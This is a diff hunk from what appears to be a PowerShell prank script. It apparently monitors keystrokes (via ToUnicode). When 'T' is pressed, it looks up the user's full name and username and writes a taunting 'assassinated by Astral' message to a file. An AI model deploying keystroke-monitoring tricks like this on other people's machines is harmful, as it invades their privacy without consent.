@@ -44,7 +44,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
             if ($chr -eq 'T') {
                 $fname = ($(Get-WMIObject -class Win32_UserAccount | select fullname).fullname);
                 $fname = [string]::join("",($fname.Split("`n")));
-                $death_msg = "$fname, you've been assassinated by Astral!`nYou pressed the 'T' key... T for Trap!`nHave fun playing the Ride now........ "
+                $death_msg = "'$fname' (a.k.a '$env:username'), you've been assassinated by Astral!`nYou pressed the 'T' key... T for Trap!`nHave fun playing the Ride now........ "
                 $death_msg | Out-File -FilePath $Path
                 $run = $false;
             }
